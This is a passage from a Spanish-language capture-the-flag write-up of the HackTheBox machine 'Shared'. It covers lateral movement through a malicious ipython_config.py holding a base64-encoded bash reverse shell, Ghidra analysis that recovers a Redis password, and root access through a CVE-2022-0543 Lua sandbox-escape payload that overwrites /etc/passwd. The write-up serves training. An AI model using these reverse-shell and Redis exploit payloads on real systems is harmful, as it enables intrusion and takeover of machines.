<span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ chmod +x .pspy
<span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ ./.pspy
...
</span><span class="code-blue">CMD: UID=0    PID=2624   | /usr/sbin/CRON -f</span>
<span class="code-blue">CMD: UID=1001 PID=2629   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython</span>  
<span class="code-blue">CMD: UID=0    PID=2628   | /bin/bash /root/c.sh</span>
<span class="code-blue">CMD: UID=0    PID=2627   | /bin/bash /root/c.sh</span>
<span class="code-blue">CMD: UID=0    PID=2626   | /bin/sh -c /root/c.sh</span>
<span class="code-blue">CMD: UID=1001 PID=2630   | /usr/bin/pkill ipython</span>
<span class="code-blue">CMD: UID=1001 PID=2631   | /usr/bin/python3 /usr/local/bin/ipython</span>
<span class="code-blue">CMD: UID=0    PID=2635   | /bin/bash /root/c.sh</span>
<span class="code-blue">CMD: UID=0    PID=2634   | /bin/bash /root/c.sh</span>
<span class="code-blue">CMD: UID=0    PID=2637   | pidof redis-server</span>
<span class="code-blue">CMD: UID=0    PID=2636   | perl -ne s/\((\d+)\)/print " $1"/ge</span>
</code></pre></div><p>El usuario con UID 1001 (<code>dan_smith</code>) está cambiándose al directorio <code>/opt/scripts_review</code> y ejecutando <code>ipython</code>.</p><p>Después de un poco de investigación, vemos que <code>ipython</code> proporciona un montón de funcionalidades que se pueden configurar en un &ldquo;<em>dotfile</em>&rdquo; llamado <code>ipython_config.py</code>. Por defecto, debería estar en el directorio personal del usuario, pero si <code>ipython</code> no lo encuentra ahí, entonces lo busca en el directorio actual. Se puede encontrar un ejemplo de <code>ipython_config.py</code> <a href="https://github.com/kan-bayashi/dotfiles/blob/master/ipython/ipython_config.py">aquí</a>.</p><p>Por tanto, la idea es añadir un archivo llamado <code>ipython_config.py</code> en <code>/opt/scripts_review</code> con código Python que será ejecutado por <code>dan_smith</code>. Por ejemplo, una <em>reverse shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ cat &gt; /opt/scripts_review/ipython_config.py
c.InteractiveShellApp.code_to_run = 'import os; os.system("echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash")'  
^C
</code></pre></div><p>Y después de unos segundos, obtendremos la conexión como <code>dan_smith</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.172.
Ncat: Connection from 10.10.11.172:51336.
bash: cannot set terminal process group (2901): Inappropriate ioctl for device  
bash: no job control in this shell
dan_smith@shared:/opt/scripts_review$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
dan_smith@shared:/opt/scripts_review$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
dan_smith@shared:/opt/scripts_review$ export TERM=xterm
dan_smith@shared:/opt/scripts_review$ export SHELL=bash
dan_smith@shared:/opt/scripts_review$ stty rows 50 columns 158
</code></pre></div><p>Ahora podemos leer la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">dan_smith@shared:/opt/scripts_review$ cd  
dan_smith@shared:~$ cat user.txt
8cf849aae38747f376fba467db547f98
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Este usuario pertenece al grupo <code>sysadmin</code>, que posee un archivo ELF en <code>/usr/local/bin/redis_connector_dev</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
dan_smith@shared:~$ find / -group sysadmin 2&gt;/dev/null
/usr/local/bin/redis_connector_dev
dan_smith@shared:~$ ls -l /usr/local/bin/redis_connector_dev
-rwxr-x--- 1 root sysadmin 5974154 Mar 20 09:41 <span class="code-green">/usr/local/bin/redis_connector_dev</span>
dan_smith@shared:~$ file /usr/local/bin/redis_connector_dev
/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped  
</code></pre></div><h3 id="análisis-de-redis_connector_dev">Análisis de <code>redis_connector_dev</code></h3><p>Podemos abrir el binario en Ghidra. Esto es <code>main.main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> main.</span><span class="mtk8">main</span><span class="mtk1">(sigaction </span><span class="mtk5">*</span><span class="mtk9 mtki">param_1</span><span class="mtk1">, sigaction </span><span class="mtk5">*</span><span class="mtk9 mtki">param_2</span><span class="mtk1">, undefined8 </span><span class="mtk9 mtki">param_3</span><span class="mtk1">, undefined8 </span><span class="mtk9 mtki">param_4</span><span class="mtk1">, sigaction </span><span class="mtk5">*</span><span class="mtk9 mtki">param_5</span><span class="mtk1">, sigaction </span><span class="mtk5">*</span><span class="mtk9 mtki">param_6</span><span class="mtk1">) {</span>  
<span class="mtk1">  undefined8 uVar1;</span>
<span class="mtk1">  undefined </span><span class="mtk5">*</span><span class="mtk1">puVar2;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> lVar3;</span>
<span class="mtk1">  undefined8 extraout_RDX;</span>
<span class="mtk1">  undefined8 extraout_RDX_00;</span>
<span class="mtk1">  undefined8 extraout_RDX_01;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  undefined in_stack_00000000;</span>
<span class="mtk1">  undefined7 in_stack_00000001;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">pvVar4;</span>
<span class="mtk1">  undefined8 uVar5;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> lVar6;</span>
<span class="mtk1">  undefined local_58[</span><span class="mtk6">16</span><span class="mtk1">];</span>
<span class="mtk1">  undefined local_48[</span><span class="mtk6">16</span><span class="mtk1">];</span>
<span class="mtk1">  undefined local_38[</span><span class="mtk6">16</span><span class="mtk1">];</span>
<span class="mtk1">  undefined local_28[</span><span class="mtk6">16</span><span class="mtk1">];</span>
<span class="mtk1">  undefined local_18[</span><span class="mtk6">16</span><span class="mtk1">];</span>
<span class="mtk1">  </span>
<span class="mtk1">  lVar3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)(in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">fffffff8</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(undefined </span><span class="mtk5">**</span><span class="mtk1">)(ulong </span><span class="mtk5">*</span><span class="mtk1">)(lVar3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">&lt;=</span><span class="mtk1"> local_38 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span>
<span class="mtk1">      local_38 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(undefined </span><span class="mtk5">**</span><span class="mtk1">)(ulong </span><span class="mtk5">*</span><span class="mtk1">)(lVar3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">)) {</span>
<span class="mtk1">    local_48 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">CONCAT88</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">6b0760</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">6265a0</span><span class="mtk1">);</span>
<span class="mtk1">    pvVar4 </span><span class="mtk5">=</span><span class="mtk1"> os.Stdout;</span>
<span class="mtk1">    fmt.</span><span class="mtk8">Fprintln</span><span class="mtk1">(param_1, param_2, go.itab.*os.File, io.Writer, lo</span><span class="mtk1">cal_48, param_5, param_6,</span>
<span class="mtk1">                 (</span><span class="mtk7 mtki">long</span><span class="mtk1">)go.itab.*os.File, io.Writer, os.Stdout, (sigactio</span><span class="mtk1">n </span><span class="mtk5">**</span><span class="mtk1">)local_48, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    runtime.</span><span class="mtk8">newobject</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">)((</span><span class="mtk7 mtki">long</span><span class="mtk1">)pvVar4 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">18</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(undefined </span><span class="mtk5">**</span><span class="mtk1">)((</span><span class="mtk7 mtki">long</span><span class="mtk1">)pvVar4 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_0067171e;</span>
<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">)((</span><span class="mtk7 mtki">long</span><span class="mtk1">)pvVar4 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">38</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(undefined </span><span class="mtk5">**</span><span class="mtk1">)((</span><span class="mtk7 mtki">long</span><span class="mtk1">)pvVar4 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">30</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00671c55;</span>
<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">)((</span><span class="mtk7 mtki">long</span><span class="mtk1">)pvVar4 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">40</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">    github.com</span><span class="mtk5">/</span><span class="mtk1">go</span><span class="mtk5">-</span><span class="mtk1">redis</span><span class="mtk5">/</span><span class="mtk1">redis.NewClient</span>
<span class="mtk1">              (param_1, param_2, extraout_RDX, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00671c55, param_5, param_6, pvVar4);</span>
<span class="mtk1">    puVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_006265a0;</span>
<span class="mtk1">    local_58 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">CONCAT88</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">6b0770</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">6265a0</span><span class="mtk1">);</span>
<span class="mtk1">    lVar6 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">    fmt.</span><span class="mtk8">Fprintln</span><span class="mtk1">(param_1, param_2, ocal_58, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_006265a0, param_5, param_6,</span>
<span class="mtk1">                 (</span><span class="mtk7 mtki">long</span><span class="mtk1">)go.itab.*os.File, io.Writer, os.Stdout, (sigactio</span><span class="mtk1">n </span><span class="mtk5">**</span><span class="mtk1">)local_58, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    local_38 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">CONCAT88</span><span class="mtk1">(</span><span class="mtk6">6</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">66f8d4</span><span class="mtk1">);</span>
<span class="mtk1">    uVar5 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">    github.com</span><span class="mtk5">/</span><span class="mtk1">go</span><span class="mtk5">-</span><span class="mtk1">redis</span><span class="mtk5">/</span><span class="mtk1">redis.(</span><span class="mtk5">*</span><span class="mtk1">cmdable).Info</span>
<span class="mtk1">              (param_1, param_2, extraout_RDX_00, </span><span class="mtk1">puVar2, param_5, param_6,</span>
<span class="mtk1">               (undefined8 </span><span class="mtk5">*</span><span class="mtk1">)((</span><span class="mtk7 mtki">long</span><span class="mtk1">)pvVar4 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">48</span><span class="mtk1">), (undefined8 </span><span class="mtk5">*</span><span class="mtk1">)local_38, </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    lVar3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)(lVar6 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">18</span><span class="mtk1">);</span>
<span class="mtk1">    uVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">)(lVar6 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">);</span>
<span class="mtk1">    runtime.</span><span class="mtk8">convTstring</span><span class="mtk1">(param_1, param_2, uVar1, lVar3, param_5, param_6,</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">)(lVar6 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">30</span><span class="mtk1">),</span>
<span class="mtk1">                        </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)(lVar6 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">38</span><span class="mtk1">));</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (lVar3 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">      lVar3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">)(lVar3 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">    local_28 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">CONCAT88</span><span class="mtk1">(uVar5, </span><span class="mtk5">0x</span><span class="mtk6">6265a0</span><span class="mtk1">);</span>
<span class="mtk1">    local_18 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">CONCAT88</span><span class="mtk1">(uVar1, lVar3);</span>
<span class="mtk1">    fmt.</span><span class="mtk8">Fprintln</span><span class="mtk1">(param_1, param_2, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_006265a0, go.itab.*os.File, io.Writer, param_5</span><span class="mtk1">, param_6,</span>
<span class="mtk1">                 (</span><span class="mtk7 mtki">long</span><span class="mtk1">)go.itab.*os.File, io.Writer, os.Stdout, (sigactio</span><span class="mtk1">n </span><span class="mtk5">**</span><span class="mtk1">)local_28, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>
<span class="mtk1">  runtime.morestack_noctxt</span>
<span class="mtk1">            (param_1, param_2, param_3, lVar3, (</span><span class="mtk8">undefined</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">) [</span><span class="mtk6">16</span><span class="mtk1">])param_5, param_6,</span>
<span class="mtk1">             </span><span class="mtk8">CONCAT71</span><span class="mtk1">(in_stack_00000001, in_stack_00000000));</span>
<span class="mtk1">  main.</span><span class="mtk8">main</span><span class="mtk1">(param_1, param_2, extraout_RDX_01, lVar3, param_5</span><span class="mtk1">, param_6);</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Como está compilado en Go, es un poco difícil de leer, pero podemos ver que utiliza <code>go-redis</code>. Si vamos a su página de <a href="https://github.com/go-redis/redis">GitHub</a>, veremos que se utiliza <code>NewClient</code> para conectarse a una instancia de Redis usando la contraseña correspondiente:</p><p><img src="/images/HTB/Shared/Shared-NewClient.png" alt="Shared NewClient"></p><p>Existe un ejemplo en el mismo repositorio:</p><p><img src="/images/HTB/Shared/Shared-NewClient-example.png" alt="Shared NewClient example"></p><p>Por tanto, el <em>host</em> y el puerto se pasan en el primer parámetro, que es <code>DAT_0067171e</code> en el código fuente descompilado (<code>localhost:6379</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">                     DAT_0067171e             XREF[5]:     github.com/go-redis/redis.(*Opti  
                                                           github.com/go-redis/redis.(*Opti
                                                           github.com/go-redis/redis.(*Opti
                                                           main.main:0060a944(*),
                                                           main.main:0060a94b(*)
0067171e 6c              ??         6Ch    l
0067171f 6f              ??         6Fh    o
00671720 63              ??         63h    c
00671721 61              ??         61h    a
00671722 6c              ??         6Ch    l
00671723 68              ??         68h    h
00671724 6f              ??         6Fh    o
00671725 73              ??         73h    s
00671726 74              ??         74h    t
00671727 3a              ??         3Ah    :
00671728 36              ??         36h    6
00671729 33              ??         33h    3
0067172a 37              ??         37h    7
0067172b 39              ??         39h    9
</code></pre></div><p>Y la contraseña está en <code>DAT_00671c55</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">                     DAT_00671c55             XREF[2]:     main.main:0060a957(*),  
                                                           main.main:0060a95e(*)
00671c55 46              ??         46h    F
00671c56 32              ??         32h    2
00671c57 57              ??         57h    W
00671c58 48              ??         48h    H
00671c59 71              ??         71h    q
00671c5a 4a              ??         4Ah    J
00671c5b 55              ??         55h    U
00671c5c 7a              ??         7Ah    z
00671c5d 32              ??         32h    2
00671c5e 57              ??         57h    W
00671c5f 45              ??         45h    E
00671c60 7a              ??         7Ah    z
00671c61 3d              ??         3Dh    =
00671c62 47              ??         47h    G
00671c63 71              ??         71h    q
00671c64 71              ??         71h    q
00671c65 47              ??         47h    G
00671c66 43              ??         43h    C
00671c67 20              ??         20h
00671c68 73              ??         73h    s
00671c69 63              ??         63h    c
00671c6a 61              ??         61h    a
00671c6b 76              ??         76h    v
00671c6c 65              ??         65h    e
00671c6d 6e              ??         6Eh    n
00671c6e 67              ??         67h    g
00671c6f 65              ??         65h    e
00671c70 20              ??         20h
00671c71 77              ??         77h    w
00671c72 61              ??         61h    a
00671c73 69              ??         69h    i
00671c74 74              ??         74h    t
00671c75 47              ??         47h    G
00671c76 43              ??         43h    C
00671c77 20              ??         20h
00671c78 77              ??         77h    w
00671c79 6f              ??         6Fh    o
00671c7a 72              ??         72h    r
00671c7b 6b              ??         6Bh    k
00671c7c 65              ??         65h    e
00671c7d 72              ??         72h    r
00671c7e 20              ??         20h
00671c7f 28              ??         28h    (
00671c80 69              ??         69h    i
00671c81 64              ??         64h    d
00671c82 6c              ??         6Ch    l
00671c83 65              ??         65h    e
00671c84 29              ??         29h    )
</code></pre></div><p>Y así, tenemos esta contraseña: <code>F2WHqJUz2WEz=GqqGC</code>. Como el binario se conecta a Redis, podemos probar a conectarnos usando <code>redis-cli</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">dan_smith@shared:~$ redis-cli
127.0.0.1:6379&gt; auth F2WHqJUz2WEz=GqqGC
(error) WRONGPASS invalid username-password pair  
</code></pre></div><p>Pero es incorrecta&mldr; Como Go trata las <em>strings</em> de manera inusual, Ghidra no es capaz de analizar las <em>strings</em> correctamente a veces (las <em>strings</em> en Go no terminan en byte nulo). Vamos a probar a quitar algunos caracteres por el final:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">127.0.0.1:6379&gt; auth F2WHqJUz2WEz=GqqG
(error) WRONGPASS invalid username-password pair  
127.0.0.1:6379&gt; auth F2WHqJUz2WEz=Gqq
OK
</code></pre></div><p>Perfecto, estamos dentro.</p><h3 id="explotación-de-redis">Explotación de Redis</h3><p>Existe una vulnerabilidad reciente relacionada con Redis que permite a un atacante ejecutar código en Lua para escapar de la <em>sandbox</em> y ganar ejecución de comandos como <code>root</code> (el usuario que corre Redis). Se trata del <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0543">CVE-2022-0543</a>.</p><p>Un ejemplo de explotación se puede encontrar <a href="https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543">aquí</a>. Y es explotable:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">127.0.0.1:6379&gt; eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0  
"uid=0(root) gid=0(root) groups=0(root)\n"
</code></pre></div><p>Ahora podemos modificar <code>/etc/passwd</code> y ponerle una contraseña a <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">openssl</span> passwd 7Rocky  
CohYEKIMKecEQ
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">127.0.0.1:6379&gt; eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("sed -i s/root:x/root:CohYEKIMKecEQ/g /etc/passwd", "r"); local res = f:read("*a"); f:close(); return res' 0  
""
127.0.0.1:6379&gt;
dan_smith@shared:~$ head -1 /etc/passwd
root:CohYEKIMKecEQ:0:0:root:/root:/bin/bash
</code></pre></div><p>Y como la contraseña ha cambiado, podemos cambiarnos al usuario <code>root</code> usando <code>7Rocky</code> como contraseña:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">dan_smith@shared:~$ su root
Password:
root@shared:/home/dan_smith# cat /root/root.txt  
6eedbf18e767bd0887a363166c42ebc0
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#encontrando-un-sqli">Encontrando un SQLi</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#explotación-de-sqli">Explotación de SQLi</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-dan_smith">Movimiento lateral al usuario <code>dan_smith</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#análisis-de-redis_connector_dev">Análisis de <code>redis_connector_dev</code></a></li><li><a href="#explotación-de-redis">Explotación de Redis</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a 